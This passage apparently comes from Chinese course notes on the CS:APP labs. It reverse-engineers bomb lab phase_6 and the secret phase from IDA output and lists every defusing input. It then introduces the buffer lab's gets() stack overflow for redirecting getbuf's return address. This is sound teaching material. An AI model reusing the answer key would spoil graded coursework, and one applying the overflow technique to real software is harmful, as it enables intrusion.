DB db 0 .data: 00000000006027 DC db 0 .data: 00000000006027 DD db 0 .data: 00000000006027 DE db 0 .data: 00000000006027 DF db 0 .data: 00000000006027 E0 public node6 .data: 00000000006027 E0 node6 db 0 A1h .data: 00000000006027 E1 db 2 .data: 00000000006027 E2 db 0 .data: 00000000006027 E3 db 0 .data: 00000000006027 E4 db 6 .data: 00000000006027 E5 db 0 .data: 00000000006027 E6 db 0 .data: 00000000006027 E7 db 0 .data: 00000000006027 E8 db 0 F0h .data: 00000000006027 E9 db 27 h ; ' .data: 00000000006027 EA db 60 h ; ` .data: 00000000006027 EB db 0 .data: 00000000006027 EC db 0 .data: 00000000006027 ED db 0 .data: 00000000006027 EE db 0 .data: 00000000006027 EF db 0 .data: 00000000006027 F0 public node7 .data: 00000000006027 F0 node7 db 1 Eh .data: 00000000006027 F1 db 1 .data: 00000000006027 F2 db 0 .data: 00000000006027 F3 db 0 .data: 00000000006027 F4 db 7 .data: 00000000006027 F5 db 0 .data: 00000000006027 F6 db 0 .data: 00000000006027 F7 db 0 .data: 00000000006027 F8 db 0 .data: 00000000006027 F9 db 28 h ; ( .data: 00000000006027 FA db 60 h ; ` .data: 00000000006027 FB db 0 .data: 00000000006027 FC db 0 .data: 00000000006027 FD db 0 .data: 00000000006027 FE db 0 .data: 00000000006027 FF db 0 .data: 0000000000602800 public node8 .data: 0000000000602800 node8 db 58 h ; X .data: 0000000000602801 db 2 .data: 0000000000602802 db 0 .data: 0000000000602803 db 0 .data: 0000000000602804 db 8 .data: 0000000000602805 db 0 .data: 0000000000602806 db 0 .data: 0000000000602807 db 0 .data: 0000000000602808 db 10 h .data: 0000000000602809 db 28 h ; ( .data: 000000000060280 A db 60 h ; ` .data: 000000000060280 B db 0 .data: 000000000060280 C db 0 .data: 000000000060280 D db 0 .data: 000000000060280 E db 0 .data: 000000000060280 F db 0 .data: 0000000000602810 public node9 .data: 0000000000602810 node9 db 11 h .data: 0000000000602811 db 2 .data: 0000000000602812 db 0 .data: 0000000000602813 db 0 .data: 0000000000602814 db 9 .data: 0000000000602815 db 0 .data: 0000000000602816 db 0 .data: 0000000000602817 db 0 .data: 0000000000602818 db 0 .data: 0000000000602819 db 0 .data: 000000000060281 A db 0 .data: 000000000060281 B db 0 .data: 000000000060281 C db 0 .data: 000000000060281 D db 0 .data: 000000000060281 E db 0 .data: 000000000060281 F db 0 node 1 2 3 4 5 6 7 8 9 10 11 12 13 14 .data: 0000000000602780 public node0 .data: 0000000000602780 node0 dd 0 ; DATA XREF: phase_6+13\u2191w .data: 0000000000602780 ; phase_6+19\u2191o ... .data: 0000000000602784 align 8 .data: 0000000000602788 dq offset node1 .data: 0000000000602790 public node1 .data: 0000000000602790 node1 dd 176 h ; DATA XREF: .data:0000000000602788\u2191o .data: 0000000000602794 dd 1 .data: 0000000000602798 dq offset node2 .data: 00000000006027 A0 public node2 .data: 00000000006027 A0 node2 dd 33 Ah ; DATA XREF: .data:0000000000602798\u2191o .data: 00000000006027 A4 dd 2 .data: 00000000006027 A8 dq offset node3 .data: 00000000006027 B0 public node3 \u6ce8\u610f\u5230 node, raw \u6807\u7b7e\u5185\uff0c\u8fd9\u6bb5\u6570\u636e\u533a\u7684\u6bcf\u4e2anode\u7684\u540e8\u4e2a\u5b57\u8282\u4f3c\u4e4e\u6b63\u597d\u662f\u4e0b\u4e00\u4e2anode\u7684\u5730\u5740\uff0c\u6309D\u8f6c\u6362\u6210\u4e0a\u9762\u7684 node \u6807\u7b7e\u91cc\u90a3\u6837\uff1a \u57fa\u672c\u4e0a\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u4e00\u4e2a\u8282\u70b9\u91cc\u6709\u4e00\u4e2a\u6570\u636e\u548c\u5e8f\u53f7\uff0c\u8fd8\u6709\u4e00\u4e2a\u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u6307\u9488\u3002\u4e8e\u662f\u5230 Structures \u91cc\u6dfb\u52a0\u4e00\u4e2a\u7ed3\u6784\u4f53 Node \uff0c\u5c31\u50cf\u8fd9\u4e2a\u6837\u5b50\uff1a 1 2 3 4 5 6 7 8 00000000 Node struc ; (sizeof=0x10, mappedto_13) 00000000 ; XREF: .data:node1/r 00000000 ; .data:node2/r 00000000 data dd ? 00000004 index dd ? 00000008 next dq ? ; offset 00000010 Node ends 00000010 \u56de\u5230\u6c47\u7f16\u4ee3\u7801\u6bb5\uff0c\u5bf9\u7740\u6bcf\u4e2anode\u6309Y\uff0c\u6307\u5b9a\u5b83\u7684\u7c7b\u578b\uff0c\u5c31\u4f1a\u53d8\u6210\u8fd9\u6837\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 .data: 0000000000602780 public node0 .data: 0000000000602780 ; Node node0 .data: 0000000000602780 node0 Node < 0 , 0 , offset node1 > .data: 0000000000602780 ; DATA XREF: phase_6+13\u2191w .data: 0000000000602780 ; phase_6+19\u2191o ... .data: 0000000000602790 public node1 .data: 0000000000602790 ; Node node1 .data: 0000000000602790 node1 Node < 176 h , 1 , offset node2.data > .data: 0000000000602790 ; DATA XREF: .data:node0\u2191o .data: 00000000006027 A0 public node2 .data: 00000000006027 A0 ; Node node2 .data: 00000000006027 A0 node2 Node < 33 Ah , 2 , offset node3 > .data: 00000000006027 A0 ; DATA XREF: .data:node1\u2191o .data: 00000000006027 B0 public node3 .data: 00000000006027 B0 ; Node node3 .data: 00000000006027 B0 node3 Node < 172 h , 3 , offset node4 > .data: 00000000006027 B0 ; DATA XREF: .data:node2\u2191o .data: 00000000006027 C0 public node4 .data: 00000000006027 C0 ; Node node4 .data: 00000000006027 C0 node4 Node < 30 Eh , 4 , offset node5 > .data: 00000000006027 C0 ; DATA XREF: .data:node3\u2191o .data: 00000000006027 D0 public node5 .data: 00000000006027 D0 ; Node node5 .data: 00000000006027 D0 node5 Node < 1 E8h , 5 , offset node6 > .data: 00000000006027 D0 ; DATA XREF: .data:node4\u2191o .data: 00000000006027 E0 public node6 .data: 00000000006027 E0 ; Node node6 .data: 00000000006027 E0 node6 Node < 2 A1h , 6 , offset node7 > .data: 00000000006027 E0 ; DATA XREF: .data:node5\u2191o .data: 00000000006027 F0 public node7 .data: 00000000006027 F0 ; Node node7 .data: 00000000006027 F0 node7 Node < 11 Eh , 7 , offset node8 > .data: 00000000006027 F0 ; DATA XREF: .data:node6\u2191o .data: 0000000000602800 public node8 .data: 0000000000602800 ; Node node8 .data: 0000000000602800 node8 Node < 258 h , 8 , offset node9 > .data: 0000000000602800 ; DATA XREF: .data:node7\u2191o .data: 0000000000602810 public node9 .data: 0000000000602810 ; Node node9 .data: 0000000000602810 node9 Node < 211 h , 9 , 0 > ; DATA XREF: .data:node8\u2191o \u597d\u4e86\uff0c\u6bcf\u4e2a\u6570\u636e\u90fd\u76f8\u5f53\u6e05\u695a\u4e86\u3002\u6765\u770b\u770b phase_6() \u5427\uff0c\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u53c2\u6570\u662f\u4e00\u4e2a Node * \uff0c\u6240\u4ee5\u8fd8\u662f\u5bf9\u7740\u53c2\u6570\u6309Y\u628a\u7c7b\u578b\u6539\u6210 Node * \u3002\u8fd9\u4e2a\u65f6\u5019\u53ea\u8981\u518d\u6309\u4e00\u4e0bF5\uff08\u4f3c\u4e4e\u53ea\u662f\u4e3a\u4e86\u5237\u65b0\u4e00\u4e0b\uff09\uff0c\u5c31\u4f1a\u53d1\u73b0\u5df2\u7ecf...\uff1a 1 2 3 4 5 6 7 8 9 10 Node * __fastcall phase_6 ( const char * a1 ) { Node * result ; // rax node0 . data = strtol ( a1 , 0LL , 10 ); result = fun6 ( & node0 ) -> next -> next -> next ; if ( result -> data != node0 . data ) explode_bomb ( & node0 , 0LL ); return result ; } \u8fd8\u6709\u8fd9\u4e2a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 Node * __fastcall fun6 ( Node * a1 ) { Node * v1 ; // r8 Node * result ; // rax Node * v3 ; // rcx Node * v4 ; // rdx Node * v5 ; // rcx v1 = a1 -> next ; a1 -> next = 0LL ; result = a1 ; v3 = a1 ; if ( ! v1 ) return a1 ; while ( 1 ) { v4 = v3 ; if ( v3 && v3 -> data > v1 -> data ) { while ( 1 ) { v4 = v3 -> next ; if ( ! v4 ) break ; if ( v4 -> data <= v1 -> data ) { a1 = v3 ; goto LABEL_8 ; } v3 = v3 -> next ; } a1 = v3 ; } LABEL_8 : if ( a1 == v4 ) result = v1 ; else a1 -> next = v1 ; v5 = v1 -> next ; v1 -> next = v4 ; if ( ! v5 ) return result ; v1 = v5 ; v3 = result ; a1 = result ; } } \u8fd9\u4e2a\u65f6\u5019\u6211\u5df2\u7ecf\u7d2f\u4e86\uff0c\u4e0d\u60f3\u518d\u5199\u4e86...\u7ecf\u8fc7\u5c1d\u8bd5\u8f93\u5165\u94fe\u8868\u4e2d\u7684\u6570\u636e\u52a8\u6001\u8c03\u8bd5\u53ef\u4ee5\u53d1\u73b0\uff0c\u51fd\u6570\u5bf9\u94fe\u8868\u8fdb\u884c\u4e86\u6392\u5e8f\uff0c\u5e94\u8be5\u8f93\u5165\u7b2c\u56db\u5927\u7684\u6570\u636e 258h \u5c31\u53ef\u4ee5\u4e86\u3002\u6240\u4ee5\uff1a 1 600","title":"phase_6()"},{"location":"szu_courses/csapp/bomb_lab/#secret_phase","text":"\u5176\u5b9e\u5728IDA\u5de6\u4fa7\u680f\u80fd\u770b\u5230\u4e00\u4e2a\u9690\u85cf\u5173 secret_phase() \uff0c\u53cc\u51fb\u5b83\uff0c\u7136\u540e\u6309X\u67e5\u627e\u5f15\u7528\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u6bcf\u5173 phase_defused() \u65f6\u90fd\u4f1a\u68c0\u67e5\u662f\u5426\u89e6\u53d1\u9690\u85cf\u5173\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void __fastcall phase_defused ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { char v6 ; // [rsp+Ch] [rbp-5Ch] char v7 ; // [rsp+10h] [rbp-58h] if ( num_input_strings == 6 ) { if ( ( unsigned int ) __isoc99_sscanf ( & unk_603030 , \" %d %s \" , & v6 , & v7 , a5 , a6 ) == 2 && !( unsigned int ) strings_not_equal ( & v7 , \" austinpowers \" ) ) { puts ( \" Curses , you ' ve found the secret phase ! \" ) ; puts ( \" But finding it and solving it are quite different... \" ) ; secret_phase (( __int64 ) \" But finding it and solving it are quite different... \" , ( __int64 ) \" austinpowers \" ) ; } puts ( \" Congratulations ! You ' ve defused the bomb ! Again ! \" ) ; } } \u52a8\u6001\u8c03\u8bd5\u7684\u65f6\u5019\u80fd\u53d1\u73b0 \u7b2c\u56db\u5173 \u65f6\u9700\u8981\u8f93\u5165\uff1a 1 9 austinpowers \u5c31\u53ef\u4ee5\u89e6\u53d1\u9690\u85cf\u5173\u3002\u9690\u85cf\u5173\u662f\u4e2a\u4e8c\u53c9\u6811\uff0c\u5148\u52a0\u5165\u4ee5\u4e0b\u7ed3\u6784\u4f53\uff1a 1 2 3 4 5 6 7 8 9 00000000 BiTree struc ; (sizeof=0x20, mappedto_14) 00000000 ; XREF: .data:n1/r 00000000 ; .data:n21/r ... 00000000 data dq ? 00000008 lchild dq ? ; offset 00000010 rchild dq ? ; offset 00000018 unknown dq ? 00000020 BiTree ends 00000020 \u8fd8\u662fF5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall secret_phase ( __int64 a1 ) { const char * v1 ; // rdi unsigned int v2 ; // ebx v1 = ( const char * ) read_line ( a1 ); v2 = strtol ( v1 , 0LL , 10 ); if ( v2 - 1 > 0x3E8 ) explode_bomb ( v1 , 0LL ); if ( ( unsigned int ) fun7 (( BiTree * ) & n1 , v2 ) != 3 ) explode_bomb ( & n1 , v2 ); puts ( \"Wow! You've defused the secret stage!\" ); return phase_defused ( \"Wow! You've defused the secret stage!\" ); } \u8fd8\u6709\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 signed __int64 __fastcall fun7 ( BiTree * a1 , int a2 ) { signed __int64 result ; // rax if ( ! a1 ) return 0xFFFFFFFFLL ; if ( SLODWORD ( a1 -> data ) > a2 ) return 2 * ( unsigned int ) fun7 ( a1 -> lchild , a2 ); result = 0LL ; if ( LODWORD ( a1 -> data ) != a2 ) result = 2 * ( unsigned int ) fun7 ( a1 -> rchild , a2 ) + 1 ; return result ; } \u8fd8\u6709\u4e8c\u53c9\u6811\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 .data: 00000000006025 A0 public n1 .data: 00000000006025 A0 ; BiTree n1 .data: 00000000006025 A0 n1 BiTree < 24 h , offset n21 , offset n22 , 0 > .data: 00000000006025 A0 ; DATA XREF: secret_phase+2B\u2191o .data: 00000000006025 C0 public n21 .data: 00000000006025 C0 ; BiTree n21 .data: 00000000006025 C0 n21 BiTree < 8 , offset n31 , offset n32 , 0 > .data: 00000000006025 C0 ; DATA XREF: .data:n1\u2191o .data: 00000000006025 E0 public n22 .data: 00000000006025 E0 ; BiTree n22 .data: 00000000006025 E0 n22 BiTree < 32 h , offset n33 , offset n34 , 0 > .data: 00000000006025 E0 ; DATA XREF: .data:n1\u2191o .data: 0000000000602600 public n32 .data: 0000000000602600 ; BiTree n32 .data: 0000000000602600 n32 BiTree < 16 h , offset n43 , offset n44 , 0 > .data: 0000000000602600 ; DATA XREF: .data:n21\u2191o .data: 0000000000602620 public n33 .data: 0000000000602620 ; BiTree n33 .data: 0000000000602620 n33 BiTree < 2 Dh , offset n45 , offset n46 , 0 > .data: 0000000000602620 ; DATA XREF: .data:n22\u2191o .data: 0000000000602640 public n31 .data: 0000000000602640 ; BiTree n31 .data: 0000000000602640 n31 BiTree < 6 , offset n41 , offset n42 , 0 > .data: 0000000000602640 ; DATA XREF: .data:n21\u2191o .data: 0000000000602660 public n34 .data: 0000000000602660 ; BiTree n34 .data: 0000000000602660 n34 BiTree < 6 Bh , offset n47 , offset n48 , 0 > .data: 0000000000602660 ; DATA XREF: .data:n22\u2191o .data: 0000000000602680 public n45 .data: 0000000000602680 ; BiTree n45 .data: 0000000000602680 n45 BiTree < 28 h , 0 , 0 , 0 > ; DATA XREF: .data:n33\u2191o .data: 00000000006026 A0 public n41 .data: 00000000006026 A0 ; BiTree n41 .data: 00000000006026 A0 n41 BiTree < 1 , 0 , 0 , 0 > ; DATA XREF: .data:n31\u2191o .data: 00000000006026 C0 public n47 .data: 00000000006026 C0 ; BiTree n47 .data: 00000000006026 C0 n47 BiTree < 63 h , 0 , 0 , 0 > ; DATA XREF: .data:n34\u2191o .data: 00000000006026 E0 public n44 .data: 00000000006026 E0 ; BiTree n44 .data: 00000000006026 E0 n44 BiTree < 23 h , 0 , 0 , 0 > ; DATA XREF: .data:n32\u2191o .data: 0000000000602700 public n42 .data: 0000000000602700 ; BiTree n42 .data: 0000000000602700 n42 BiTree < 7 , 0 , 0 , 0 > ; DATA XREF: .data:n31\u2191o .data: 0000000000602720 public n43 .data: 0000000000602720 ; BiTree n43 .data: 0000000000602720 n43 BiTree < 14 h , 0 , 0 , 0 > ; DATA XREF: .data:n32\u2191o .data: 0000000000602740 public n46 .data: 0000000000602740 ; BiTree n46 .data: 0000000000602740 n46 BiTree < 2 Fh , 0 , 0 , 0 > ; DATA XREF: .data:n33\u2191o .data: 0000000000602760 public n48 .data: 0000000000602760 ; BiTree n48 .data: 0000000000602760 n48 BiTree < 3 E9h , 0 , 0 , 0 > ; DATA XREF: .data:n34\u2191o \u662f\u4e2a\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u6837\u5b50\u3002 \u7528 VisuAlgo - \u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u9ad8\u5ea6\u5e73\u8861\u6811 \u753b\u7684\u56fe \u770b\u51fd\u6570\u7684\u9012\u5f52\u8c03\u7528\u53ef\u4ee5\u77e5\u9053\uff1a\u8f93\u5165\u7684\u6570\u636e\u6bd4\u8282\u70b9\u5927\u5219\u8bbf\u95ee\u5de6\u5b69\u5b50\uff0c\u5c0f\u4e8e\u5219\u8bbf\u95ee\u53f3\u5b69\u5b50\uff0c\u76f8\u7b49\u4f1a\u8fd4\u56de0\u3002\u7531\u4e8e\u7ed3\u679c\u9700\u8981\u4e3a 3 \uff0c\u7ed3\u5408\u4e0a\u9762\u9012\u5f52\u8c03\u7528\u7684\u7b97\u6cd5\uff0c\u6240\u4ee5\u5e94\u8be5\u662f 2 \u00d7 (2 \u00d7 0 + 1) + 1 \uff0c\u8bbf\u95ee\u987a\u5e8f\u5e94\u8be5\u662f\uff08\u8f93\u5165\u7684\u6570\u636e\u901a\u8fc7\u5f71\u54cd\u904d\u5386\u7684\u8def\u5f84\u6765\u5f71\u54cd\u7ed3\u679c\uff09\uff1a 24h 32h 6Bh \u4e5f\u5c31\u662f\u8bf4\uff0c\u53ef\u4ee5\u8f93\u5165 6Bh \u901a\u8fc7check\uff1a 1 107 \u5e94\u8be5\u5c31\u53ef\u4ee5\u7ed3\u675f\u4e86\uff01","title":"secret_phase()"},{"location":"szu_courses/csapp/bomb_lab/#flag","text":"1 2 3 4 5 6 7 Science isn 't about why, it' s about why not ? 1 2 3 1 2 3 1 926 9 austinpowers 7 93 600 107 \u5b8c\u7ed3\u6492\u82b1... \u56fe\u7247\u6765\u6e90\uff1a \u4e0d\u89c9\u6653\u6653-\u871c\u6843\u732b \u6709\u95ee\u9898\u53ef\u4ee5\u8bc4\u8bba\u533a\u6216\u662f\u90ae\u7bb1\u544a\u8bc9\u6211\u3002\u611f\u6069\u3002","title":"flag"},{"location":"szu_courses/csapp/bomb_lab/#_1","text":"\u4e3a\u4ec0\u4e48\u662f\u5728\u7b2c\u56db\u5173\u540e\u9762\u52a0\u4e0a\u5b57\u7b26\u4e32\u89e6\u53d1\u9690\u85cf\u5173\uff1f\u6211\u770b\u5230\u4e86\u4e0a\u9762\u6709\u4e2a6\uff0c\u4e0d\u5e94\u8be5\u662f\u7b2c\u516d\u5173\u7684\u65f6\u5019\u8f93\u5165\u5417\uff1f \u989d\u8fd9\u4e2a...\u4f60\u4ed4\u7ec6\u770b\u4e00\u4e0b\u5c31\u4f1a\u53d1\u73b0\u5b83\u7684\u542b\u4e49\u5e94\u8be5\u662f\u7b2c\u516d\u5173\u7684\u65f6\u5019\u624d\u5f00\u59cb\u68c0\u67e5\u662f\u5426\u8fdb\u5165\u9690\u85cf\u5173\u3002\u800c\u8f93\u5165\u6570\u636e\u7684\u5730\u5740\u6b63\u597d\u662f\u7b2c\u56db\u5173\u7684\u5730\u65b9\uff0c\u4f60\u5728\u9759\u6001\u770b\u7684\u65f6\u5019\u4e0d\u662f\u90a3\u4e48\u5bb9\u6613\u770b\u51fa\u6765\uff0c\u4f46\u662f\u8c03\u8bd5\u7684\u65f6\u5019\u5c31\u4f1a\u5bb9\u6613\u5f97\u591a\u3002 \u4e3a\u4ec0\u4e48\u7b2c\u4e09\u5173\u7684\u8df3\u8f6c\u8868\u90a3\u4e48\u5947\u602a\uff1f \u6709\u5173\u6587\u7ae0\uff1a Does the order of case in Switch statement can vary the performance?","title":"\u5e38\u89c1\u95ee\u9898"},{"location":"szu_courses/csapp/buffer_lab/","text":"\u66f4\u65b0\uff1a\u9274\u4e8e\u5927\u5bb6\u53ea\u662f\u542c\u4e86\u4e00\u70b9\u8bfe\uff0c\u5bf9\u4e8ePWN\u4e4b\u7c7b\u7684\u4e00\u822c\u53ef\u80fd\u4e00\u70b9\u6982\u5ff5\u90fd\u6ca1\u6709\uff0c\u5e76\u4e14\u4e4b\u524d\u4e00\u7248\u7684\u6587\u7ae0\u540c\u5b66\u4eec\u8868\u793a\u4e00\u4e9b\u540d\u8bcd\u592a\u591a\u3002\u5bf9\u6b64\uff0c\u6211\u51b3\u5b9a\u8fd8\u662f\u591a\u6da6\u8272\u4e00\u4e0b\u8fd9\u7bc7\u6587\u7ae0\uff0c\u7136\u540e\uff0c\u8fd8\u8bf7\u5404\u4f4d\u5148\u770b\u4e00\u4e0b\u8fd9\u4e9b\u6587\u7ae0\u9884\u4e60\u4e00\u4e0b\uff0c\u5c31\u80fd\u66f4\u597d\u5730\u505a\u5b9e\u9a8c\u4e86\uff1a \u6808\u4ecb\u7ecd - CTF Wiki \u6808\u6ea2\u51fa\u539f\u7406 - CTF Wiki \u57fa\u672c ROP - CTF Wiki \u5982\u679c\u4f60\u8fde\u8fd9\u4e9b\u90fd\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u53ef\u80fd\u4e5f\u5c31\u4e0d\u77e5\u9053\u6211\u5728\u4e0b\u9762\u8bb2\u4ec0\u4e48\u4e86... \u5f00\u5934\u60ef\u4f8b\u5148\u819c\u4e00\u4e0b\u5927\u4f6c\u4eec\uff1a @obliviate @Apeng \u9898\u76ee\u5b58\u6863\uff1a buflab-handout.tar \u5b9e\u9a8c\u8981\u6c42 \u5bb9\u6211\u6284\u4e00\u4e0b\u5b9e\u9a8c\u7684PPT\uff1a \u76ee\u6807 \u5b9e\u9a8c\u653b\u51fb\u76ee\u6807\u7684\u7a0b\u5e8f\u4e3abufbomb\u3002\u8be5\u7a0b\u5e8f\u4e2d\u542b\u6709\u4e00\u4e2a\u5e26\u6709\u6f0f\u6d1e\u7684getbuf()\u51fd\u6570\uff0c\u5b83\u6240\u8c03\u7528\u7684\u7cfb\u7edf\u51fd\u6570gets()\u672a\u8fdb\u884c\u7f13\u51b2\u533a\u6ea2\u51fa\u4fdd\u62a4\u3002\u5176\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 int getbuf () { char buf [ 12 ]; Gets ( buf ); return 1 ; } \u7cfb\u7edf\u51fd\u6570gets()\u4ece\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u8bfb\u5b57\u7b26\u4e32\u51fd\u6570\u3002\u4ee5\u56de\u8f66\u7ed3\u675f\u8bfb\u53d6\uff0c\u4e0d\u4f1a\u5224\u65ad\u4e0a\u9650\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5458\u5e94\u8be5\u786e\u4fddbuffer\u7684\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u4ee5\u4fbf\u5728\u6267\u884c\u8bfb\u64cd\u4f5c\u65f6\u4e0d\u53d1\u751f\u6ea2\u51fa\u3002 \u8981\u6c42 \u76ee\u6807\u7a0b\u5e8fbufbomb\u5c06\u6267\u884ctest()\uff0c\u8fdb\u800c\u6267\u884cgetbuf()\uff0c\u6700\u7ec8\u6267\u884cgets()\u3002\u5176\u4e2dgets()\u4f1a\u4ece\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u3002\u8981\u6c42\u9ed1\u5ba2\u540c\u5b66\u5229\u7528\u6240\u5b66\u77e5\u8bc6\uff0c\u6784\u9020\u9002\u5f53\u7684\u8f93\u5165\u6570\u636e\uff0c\u901a\u8fc7\u6807\u51c6\u8f93\u5165\u4f20\u9012\u5230\u76ee\u6807\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u4ee5\u4e0b\u76ee\u7684\uff1a getbuf()\u8fd4\u56de\u65f6\uff0c\u4e0d\u8fd4\u56de\u5230test()\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u5230\u6307\u5b9a\u7684smoke()\u51fd\u6570\uff08\u8be5\u51fd\u6570\u5df2\u7ecf\u5b58\u5728\u4e8ebufbomb\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff09\u3002 getbuf()\u8fd4\u56de\u65f6\uff0c\u4e0d\u8fd4\u56de\u5230test()\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u5230\u6307\u5b9a\u7684fizz()\u51fd\u6570\uff08\u8be5\u51fd\u6570\u5df2\u7ecf\u5b58\u5728\u4e8ebufbomb\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff09\uff0c\u800c\u4e14\u8981\u6c42\u7ed9fizz()\u51fd\u6570\u4f20\u5165\u4e00\u4e2a\u9ed1\u5ba2cookie\u503c\u4f5c\u4e3a\u53c2\u6570\u3002\u5176\u4e2dcookie\u53ef\u4ee5\u901a\u8fc7makecookie\u5de5\u5177\u6839\u636e\u9ed1\u5ba2\u59d3\u540d\u4ea7\u751f\u2014\u2014\u201cmakecookie neo\u201d(neo\u8bf7\u66ff\u6362\u6210\u4f60\u7684\u540d\u5b57)\u3002 getbuf()\u8fd4\u56de\u65f6\uff0c\u4e0d\u8fd4\u56de\u5230test()\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de\u5230\u6307\u5b9a\u7684band()\u51fd\u6570\uff08\u8be5\u51fd\u6570\u5df2\u7ecf\u5b58\u5728\u4e8ebufbomb\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff09\uff0c\u5e76\u4e14\u5728\u8fd4\u56de\u5230band()\u4e4b\u524d\uff0c\u5148\u4fee\u6539\u5168\u5c40\u53d8\u91cfglobal_value\u4e3a\u4f60\u7684\u9ed1\u5ba2cookie\u503c\uff08cookie\u503c\u751f\u6210\u65b9\u6cd5\u4e0e\u4e0a\u4e00\u8981\u6c42\u76f8\u540c\uff09 \u64cd\u4f5c \u5df2\u77e5bufbomb\u4e2d\u6709test()\u51fd\u6570\u5c06\u4f1a\u8c03\u7528getbuf()\u51fd\u6570\uff0c\u5e76\u8c03\u7528gets()\u4ece\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u8bfb\u5165\u5b57\u7b26\u4e32\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u5927\u4e8egetbuf()\u4e2d\u7ed9\u51fa\u7684\u6570\u636e\u7f13\u51b2\u533a\u7684\u5b57\u7b26\u4e32\u800c\u7834\u574fgetbuf()\u6808\u5e27\uff0c\u6539\u53d8\u5176\u8fd4\u56de\u5730\u5740\u2014\u2014\u6307\u5411\u6211\u4eec\u63d0\u4f9b\u7684\u653b\u51fb\u51fd\u6570\u3002 \u5177\u4f53\u64cd\u4f5c \u8fd9\u4e2a\u7231\u770b\u4e0d\u770b\uff0c\u6211\u4e0b\u9762\u5199\u3002 \u4f7f\u7528gdb\u548cobjdump\u5206\u6790\u5176\u6808\u5e27\u7ed3\u6784\uff0c\u786e\u5b9atest()\u8c03\u7528getbuf()\u540e\u8fd4\u56de\u5730\u5740\u4e0ebuf\u7f13\u51b2\u533a\u76f8\u5bf9\u4f4d\u7f6e\u5173\u7cfb\uff1b \u6839\u636e\u76ee\u6807\u653b\u51fb\u51fd\u6570\u5730\u5740\uff0c\u6784\u9020\u51fa\u4f20\u7ed9gets()\u7684\u6570\u636e\uff08\u7528\u4e8e\u586b\u5145\u7f13\u51b2\u533a\u5e76\u7834\u574f\u6808\u5e27\u7ed3\u6784\uff09\u3002\u5c06\u6240\u6784\u9020\u7684\u6570\u636e\u6bcf\u5b57\u8282\u752816\u8fdb\u5236\u6570\u5b57\u8868\u793a\uff08\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u4f8b\u59820x3\u7528\u4e24\u4e2a\u5b57\u7b26\u8868\u793a\u4e3a\u201c03\u201d\uff09\uff0c\u5e76\u4fdd\u5b58\u5728exploit.txt\u6587\u4ef6\u4e2d\u3002 \u5c06exploit.txt\u6587\u672c\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u901a\u8fc7sendstring\u5de5\u5177\u8f6c\u6362\u6210char\u7c7b\u578b\u7684\u6570\u636e\u2014\u2014\u4fdd\u5b58\u5728exploit raw.txt\u4e2d\u3002\u6bd4\u5982\u5229\u7528\u7ba1\u9053\u201ccat exploit.txt | ./sendstring | ./exploit raw.txt\u201d\u6216\u901a\u8fc7\u91cd\u5b9a\u5411\u201c./sendstring < exploit.txt > exploit_raw.txt\u201d \u6267\u884cbufbomb\uff0c\u5e76\u5c06\u8f6c\u6362\u540e\u7684\u6570\u636e\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165\u6570\u636e\u4f20\u5165bufbomb\u3002\u5177\u4f53\u65b9\u6cd5\u6709\u591a\u79cd\uff0c\u4f8b\u5982\u201ccat exploit raw.txt | bufbomb \u2013t neo\u201d\u3001\u201cbufbomb -t neo< exploit raw.txt\u201d\u3002\u5176\u4e2dneo\u8bf7\u66ff\u6362\u6210\u540c\u5b66\u81ea\u5df1\u7684\u540d\u5b57\u3002 \u5c06\u53c2\u6570\u4f20\u5165bufbomb\u65f6\uff0c\u4e5f\u53ef\u6307\u76f4\u63a5\u4eceexploit.txt\u6587\u4ef6\u5f00\u59cb\uff0c\u6267\u884c\u201c$ cat exploit.txt | ./sendstring | ./bufbomb -t neo\u201d\u3002\u65e0\u9700exploit_raw.txt\u7684\u4e2d\u8f6c\uff0c\u76f4\u63a5\u7531sendstring\u901a\u8fc7\u7ba1\u9053\u8f93\u5165\u5230bufbomb\u7684\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u4e2d\u3002 \u5f00\u59cb\u6298\u817e \u8fd9\u4e2a\u771f\u7684...\u5f88\u96be\u8bb2\u6e05\u695a\u662f\u600e\u4e48\u56de\u4e8b\uff0c\u6211\u89c9\u5f97\u4e3b\u8981\u8fd8\u662f\u81ea\u5df1\u8c03\u51e0\u6b21\u5c31\u4f1a\u5f88\u76f4\u89c2\u4e86\u3002 